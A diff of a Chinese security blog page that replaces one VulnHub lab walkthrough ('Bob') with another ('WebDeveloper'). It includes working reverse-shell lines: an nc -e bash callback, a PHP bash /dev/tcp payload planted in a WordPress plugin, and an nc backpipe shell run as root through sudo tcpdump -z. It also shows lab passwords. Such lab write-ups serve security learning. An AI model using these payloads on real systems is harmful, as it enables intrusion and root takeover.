@@ -4,21 +4,15 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="Bob：Linux命令基础绕过防护及gpg加密文件, SummerOne">
+    <meta name="keywords" content="WebDeveloper：WordPress编辑插件获取反弹shell, SummerOne">
     <meta name="description" content="
 靶机下载地址
 
-1.信息收集端口扫描：
+1.信息收集端口扫描
+从nmap扫描结果可以看出，80端口是一个WordPress应用，版本是4.9.8.
 
-web枚举：
-
-nmap扫描到robots.txt文件，查看文件内容：
-
-依次查看网页，除了login.php无法访问，其他页面如下：
-
-
-
-2.绕过过滤获取反弹shell重点看一下这个dev_s">
+用wpsan扫描靶机，枚举用户：
+wpscan --url http:&amp;#x2F;&amp;#x2F;192.168.7">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -30,7 +24,7 @@ nmap扫描到robots.txt文件，查看文件内容：
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>Bob：Linux命令基础绕过防护及gpg加密文件 | SummerOne</title>
+    <title>WebDeveloper：WordPress编辑插件获取反弹shell | SummerOne</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
     <style>
@@ -338,7 +332,7 @@ nmap扫描到robots.txt文件，查看文件内容：
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">Bob：Linux命令基础绕过防护及gpg加密文件</h1>
+                    <h1 class="description center-align post-title">WebDeveloper：WordPress编辑插件获取反弹shell</h1>
                 </div>
             </div>
         </div>
@@ -391,7 +385,7 @@ nmap扫描到robots.txt文件，查看文件内容：
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2023-01-09
+                    2023-01-13
                 </div>
                 
 
@@ -421,54 +415,74 @@ nmap扫描到robots.txt文件，查看文件内容：
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <blockquote>
-<p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/bob-101,226/">靶机下载地址</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/web-developer-1,288/">靶机下载地址</a></p>
 </blockquote>
-<h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><p>端口扫描：</p>
-<p><img src="/posts/a030ba65/image-20221218191415604.png"></p>
-<p>web枚举：</p>
-<p><img src="/posts/a030ba65/image-20221218192207718.png"></p>
-<p>nmap扫描到robots.txt文件，查看文件内容：</p>
-<p><img src="/posts/a030ba65/image-20221218192355680.png"></p>
-<p>依次查看网页，除了login.php无法访问，其他页面如下：</p>
-<p><img src="/posts/a030ba65/image-20221218193434535.png" alt="passwords.html"></p>
-<p><img src="/posts/a030ba65/image-20221218193824923.png" alt="lat_memo.html"></p>
-<p><img src="/posts/a030ba65/image-20221218193909031.png" alt="dev-shell.php"></p>
-<h2 id="2-绕过过滤获取反弹shell"><a href="#2-绕过过滤获取反弹shell" class="headerlink" title="2.绕过过滤获取反弹shell"></a>2.绕过过滤获取反弹shell</h2><p>重点看一下这个dev_shell，它把很多命令都过滤了，比如nc，ls等。</p>
-<p><img src="/posts/a030ba65/image-20230109212243919.png" alt="输入ls被过滤"></p>
-<p>但是经过测试，如果先输入未过滤命令，再加上&amp;&amp;，后面的命令就没有被过滤，可以被执行。</p>
-<p><img src="/posts/a030ba65/image-20230109212453936.png" alt="输入whoami &amp;&amp; ls"></p>
-<p>利用nc反弹shell：</p>
-<pre class="line-numbers language-none"><code class="language-none">echo &amp;&amp; nc 192.168.71.129 4444 -e &#x2F;bin&#x2F;bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/posts/93a7bd5d/image-20230113145830205.png"></p>
+<p>从nmap扫描结果可以看出，80端口是一个WordPress应用，版本是4.9.8.</p>
+<p><img src="/posts/93a7bd5d/image-20230113150029272.png"></p>
+<p>用wpsan扫描靶机，枚举用户：</p>
+<pre class="line-numbers language-none"><code class="language-none">wpscan --url http:&#x2F;&#x2F;192.168.71.159 -e u<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="/posts/a030ba65/image-20230109212849956.png" alt="获取到反弹连接"></p>
-<h2 id="3-提权"><a href="#3-提权" class="headerlink" title="3.提权"></a>3.提权</h2><p>当前权限为www-data用户。</p>
-<p>进入&#x2F;home文件夹查看各个用户的目录：</p>
-<p><img src="/posts/a030ba65/image-20230109213525540.png"></p>
-<p>在bob的目录下发现.old_passwordfile.html文件，发现jc和seb用户的密码。</p>
-<p>jc:Qwerty<br>seb:T1tanium_Pa$$word_Hack3rs_Fear_M3</p>
-<p><img src="/posts/a030ba65/image-20230109213322585.png"></p>
-<p>继续查看bob文件夹，发现了一个文档：</p>
-<p><img src="/posts/a030ba65/image-20230109215041958.png"></p>
-<p>此外，在bob目录下还有一个gpg文件，gpg是linux下的加密文件格式，需要密钥才能解密文件。</p>
-<p><img src="/posts/a030ba65/image-20230109215522141.png"></p>
-<p>后来发现文件的密钥是notes.sh文件内容的藏头，即<strong>HARPOCRATES</strong>，它是希腊的神的名字。&#x3D; &#x3D;！这尼玛对东方人不懂希腊神话的不友好啊。</p>
-<p>用以下命令解密文件：</p>
-<pre class="line-numbers language-none"><code class="language-none">gpg --batch --passphrase HARPOCRATES -d login.txt.gpg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/posts/93a7bd5d/image-20230113150758037.png"></p>
+<p>扫描到了用户webdeveloper，暴力破解密码，但是并没有成功。</p>
+<h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p>没有其他方法了，尝试web枚举必备手段之一的目录扫描吧（可以和字典密码爆破同时进行）：</p>
+<pre class="line-numbers language-none"><code class="language-none">dirb http:&#x2F;&#x2F;192.168.71.159<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p>解密出了bob用户的账密信息bob:b0bcat_</p>
-<p><img src="/posts/a030ba65/image-20230109220545070.png"></p>
-<p>登录bob账号，查看权限列表：</p>
-<p><img src="/posts/a030ba65/image-20230109220726298.png"></p>
-<p>bob拥有全部的执行权限，那就好办了，直接sudo su：</p>
-<p><img src="/posts/a030ba65/image-20230109220904499.png"></p>
-<p>然后在&#x2F;目录下找到flag</p>
-<p><img src="/posts/a030ba65/image-20230109221232949.png"></p>
-<h2 id="4-总结"><a href="#4-总结" class="headerlink" title="4.总结"></a>4.总结</h2><p>这个靶机的风格和以前做的还是挺不一样的，感觉有很多类似社工的文件给出，也有一些迷惑项，比如它给出了很多用户，甚至给了这些用户的密码，但是并没有卵用。还有一些看似有用实则没用的文件，最后证明只有bob用户的那个加密文件才能真正提权，所以本文里省略了登录其他用户账户分析的过程。</p>
-<p>主要考察以下知识点：</p>
+<p><img src="/posts/93a7bd5d/image-20230113153956390.png"></p>
+<p>访问<a target="_blank" rel="noopener" href="http://192.168.71.159/ipdata/">http://192.168.71.159/ipdata/</a></p>
+<p><img src="/posts/93a7bd5d/image-20230113154037902.png"></p>
+<h3 id="Wirshark分析数据获得密码"><a href="#Wirshark分析数据获得密码" class="headerlink" title="Wirshark分析数据获得密码"></a>Wirshark分析数据获得密码</h3><p>下载cap文件，然后用wireshark打开。打开这个包之后，发现应该是抓的是用户的登录过程，密码是通过post提交的，所以查找post包，看能不能发现密码信息。</p>
+<p>在wireshark过滤器的地方输入：</p>
+<pre class="line-numbers language-none"><code class="language-none">http.request.method&#x3D;&#x3D;&quot;POST&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/posts/93a7bd5d/image-20230113155038011.png"></p>
+<p>在第一个post包提交的表单中，发现了密码信息：</p>
+<p><img src="/posts/93a7bd5d/image-20230113155211943.png"></p>
+<p>因此获得账密：webdeveloper&#x2F;Te5eQg&amp;4sBS!Yr$)wf%(DcAd</p>
+<h2 id="2-编辑插件获得反弹shell"><a href="#2-编辑插件获得反弹shell" class="headerlink" title="2.编辑插件获得反弹shell"></a>2.编辑插件获得反弹shell</h2><p>用账密登录WordPress，登录成功。</p>
+<p><img src="/posts/93a7bd5d/image-20230113155644341.png"></p>
+<p>首先枚举插件漏洞，查看安装了哪些插件：</p>
+<p><img src="/posts/93a7bd5d/image-20230113155807651.png"></p>
+<p>这两个插件没有查到存在漏洞。</p>
+<p>利用编辑插件的功能，编辑<strong>akismet.php</strong>文件，插入php reverse shell代码：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">exec</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/bin/bash -c 'bash -i >&amp; /dev/tcp/192.168.71.139/4444 0>&amp;1'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>在kali中监听端口：</p>
+<pre class="line-numbers language-none"><code class="language-none">nc -lnvp 4444 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>点击激活插件按钮，获得反弹shell。</p>
+<p><img src="/posts/93a7bd5d/image-20230113163701732.png"></p>
+<p><img src="/posts/93a7bd5d/image-20230113163729411.png"></p>
+<h2 id="3-提权"><a href="#3-提权" class="headerlink" title="3.提权"></a>3.提权</h2><p>查看WordPress的配置文件wp-config.php</p>
+<p><img src="/posts/93a7bd5d/image-20230113164136428.png"></p>
+<p>发现了webdeveloper的密码MasterOfTheUniverse.</p>
+<p>用ssh连接成功，登录到webdeveloper用户：</p>
+<p><img src="/posts/93a7bd5d/image-20230113164609531.png"></p>
+<p>可利用tcpdump程序提权：</p>
+<p><img src="/posts/93a7bd5d/image-20230113164717212.png"></p>
+<p>sudo-tcpdump提权法：</p>
+<p><strong>1）编写反弹shell脚本</strong></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#shell.sh</span>
+<span class="token function">mknod</span> backpipe p <span class="token operator">&amp;&amp;</span> <span class="token function">nc</span> <span class="token number">192.168</span>.71.139 <span class="token number">5555</span> <span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span>backpipe <span class="token operator">|</span> /bin/bash <span class="token operator"><span class="token file-descriptor important">1</span>></span>backpipe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>将shell.sh赋予执行权限。</p>
+<p><strong>2）在kali中监听端口</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">nc -lnvp 5555<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><strong>3）利用tcpdump -z 参数执行脚本</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">sudo tcpdump -ln -i eth0 -w &#x2F;dev&#x2F;null -W 1 -G 1 -z .&#x2F;shell.sh -Z root<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/posts/93a7bd5d/image-20230113165601943.png"></p>
+<p>获取到root权限的反弹shell。</p>
+<p><img src="/posts/93a7bd5d/image-20230113165733529.png"></p>
+<p>获取到flag。</p>
+<p><img src="/posts/93a7bd5d/image-20230113170027398.png"></p>
+<h2 id="4-总结"><a href="#4-总结" class="headerlink" title="4.总结"></a>4.总结</h2><p>WordPress靶机经验总结：</p>
 <ul>
-<li>linux命令基础——绕过命令过滤；</li>
-<li>gpg文件解密；</li>
-<li>观察猜测密码的耐心。</li>
+<li>wpscan爆破密码和普通web枚举并行，节省时间；</li>
+<li>已安装插件无漏洞时可以编辑插件，植入反弹shell；</li>
+<li>进入系统首先查看WordPress的配置文件；</li>
+<li>某个应用可以sudo提权时，直接google方法，比如遇到过的nmap、tcpdump。</li>
 </ul>
 
                 
@@ -496,7 +510,7 @@ nmap扫描到robots.txt文件，查看文件内容：
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://summerone111.github.io/posts/a030ba65.html">https://summerone111.github.io/posts/a030ba65.html</a>
+                    <a href="https://summerone111.github.io/posts/93a7bd5d.html">https://summerone111.github.io/posts/93a7bd5d.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -582,9 +596,10 @@ nmap扫描到robots.txt文件，查看文件内容：
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/posts/93a7bd5d.html">
                     <div class="card-image">
@@ -602,9 +617,9 @@ nmap扫描到robots.txt文件，查看文件内容：
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2023-01-13
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-01-13
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -617,6 +632,7 @@ nmap扫描到robots.txt文件，查看文件内容：
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -639,13 +655,13 @@ nmap扫描到robots.txt文件，查看文件内容：
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/posts/c574ee4.html">
+                <a href="/posts/a030ba65.html">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="DC9：利用LFI漏洞枚举过滤端口的配置文件及passwd文件提权">
+                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="Bob：Linux命令基础绕过防护及gpg加密文件">
                         
-                        <span class="card-title">DC9：利用LFI漏洞枚举过滤端口的配置文件及passwd文件提权</span>
+                        <span class="card-title">Bob：Linux命令基础绕过防护及gpg加密文件</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -656,7 +672,7 @@ nmap扫描到robots.txt文件，查看文件内容：
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2023-01-06
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-01-09
                             </span>
                         <span class="publish-author">
                             
